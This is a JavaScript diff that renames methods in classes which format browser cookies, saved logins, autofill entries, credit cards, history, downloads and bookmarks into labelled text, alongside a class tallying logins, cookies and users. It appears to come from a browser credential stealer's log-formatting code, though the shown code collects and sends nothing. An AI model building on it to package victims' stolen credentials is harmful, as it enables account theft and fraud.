@@ -8,7 +8,7 @@ class Cookie {
         this.Value = Value;
     };
 
-    write() {
+    Write() {
         const isHostSubdomain = this.Host.startsWith('.') ? 'FALSE' : 'TRUE';
         const isExpiresDefined = this.Secure === 0 ? 'FALSE' : 'TRUE';
         return [
@@ -32,7 +32,7 @@ class Login {
         this.Timestamp = Timestamp;
     };
 
-    write() {
+    Write() {
         return [
             `LoginURL: ${this.LoginURL}`,
             `Username: ${this.Username}`,
@@ -48,7 +48,7 @@ class Autofill {
         this.Value = Value;
     };
 
-    write() {
+    Write() {
         return [
             `Input: ${this.Input}`,
             `Value: ${this.Value}`,
@@ -66,7 +66,7 @@ class CreditCard {
         this.Expiration = `${ExpirationMonth}/${ExpirationYear}`;
     };
 
-    write() {
+    Write() {
         return [
             `Guid: ${this.Guid}`,
             `Name: ${this.Name}`,
@@ -86,7 +86,7 @@ class History {
         this.Timestamp = Timestamp;
     };
 
-    write() {
+    Write() {
         return [
             `URL: ${this.URL}`,
             `Title: ${this.Title}`,
@@ -103,7 +103,7 @@ class Download {
         this.TotalBytes = TotalBytes;
     };
 
-    write() {
+    Write() {
         return [
             `URL: ${this.URL}`,
             `TargetPath: ${this.TargetPath}`,
@@ -119,7 +119,7 @@ class Bookmark {
         this.Timestamp = Timestamp;
     };
 
-    write() {
+    Write() {
         return [
             `URL: ${this.URL}`,
             `TargetName: ${this.TargetName}`,
@@ -143,7 +143,7 @@ class BrowserAllStatistics {
         this.users = [];
     };
 
-    updateStatistics(downloadsCount, historysCount, bookmarksCount, autofillsCount, loginsCount, credirCardsCount, cookiesCount) {
+    UpdateStatistics(downloadsCount, historysCount, bookmarksCount, autofillsCount, loginsCount, credirCardsCount, cookiesCount) {
         this.downloadsCount = downloadsCount;
         this.historysCount = historysCount;
         this.bookmarksCount = bookmarksCount;
@@ -153,25 +153,25 @@ class BrowserAllStatistics {
         this.cookiesCount = cookiesCount;
     };
 
-    addSites(value) {
+    AddSites(value) {
         if (!this.sites.includes(value)) {
             this.sites.push(value);
         }
     };
 
-    addCookies(value) {
+    AddCookies(value) {
         if (!this.cookies.includes(value)) {
             this.cookies.push(value);
         }
     };
     
-    addLogins(value) {
+    AddLogins(value) {
         if (!this.logins.includes(value)) {
             this.logins.push(value);
         }
     };
 
-    addUsers(value) {
+    AddUsers(value) {
         if (!this.users.includes(value)) {
             this.users.push(value);
         }
@@ -189,4 +189,4 @@ module.exports = {
     History,
     Download,
     Bookmark
-}
+};
